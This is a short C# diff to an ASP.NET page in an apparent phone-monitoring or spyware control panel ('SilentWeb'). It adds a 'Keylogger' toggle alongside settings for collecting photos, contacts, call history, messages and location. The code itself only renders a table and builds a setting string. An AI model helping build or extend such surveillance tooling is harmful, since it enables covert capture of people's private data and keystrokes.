@@ -26,7 +26,7 @@ namespace SilentWeb.ToolPages
                 {
                     Response.Write("<button type='button' class='btn btn - info btn - lg' data-toggle='modal' data-target='#myModal'>Set mask</button>");
                     Response.Write("<table class='table table-stripped table-responsive>'");
-                    Response.Write("<thead><tr><th>Photos</th><th>Contacts</th><th>Call History</th><th>Messages</th><th>Trafic</th><th>Installed Apps</th><th>Location</th><th>Battery</th></tr></thead>");
+                    Response.Write("<thead><tr><th>Photos</th><th>Contacts</th><th>Call History</th><th>Messages</th><th>Trafic</th><th>Installed Apps</th><th>Location</th><th>Keylogger</th><th>Battery</th></tr></thead>");
                     Response.Write("<tbody>");
                     Response.Write("<tr>");
                     Response.Write("<td>" + getUserMaskColumn(userMask[0]) + "</td>");
@@ -37,6 +37,7 @@ namespace SilentWeb.ToolPages
                     Response.Write("<td>" + getUserMaskColumn(userMask[5]) + "</td>");
                     Response.Write("<td>" + getUserMaskColumn(userMask[6]) + "</td>");
                     Response.Write("<td>" + getUserMaskColumn(userMask[7]) + "</td>");
+                    Response.Write("<td>" + getUserMaskColumn(userMask[8]) + "</td>");
                     Response.Write("</tr>");
                     Response.Write("</tbody>");
                     Response.Write("</table>");
@@ -157,6 +158,15 @@ namespace SilentWeb.ToolPages
             }
 
             if (location.Checked)
+            {
+                userMask.Append("1");
+            }
+            else
+            {
+                userMask.Append("0");
+            }
+
+            if (keylogger.Checked)
             {
                 userMask.Append("1");
             }
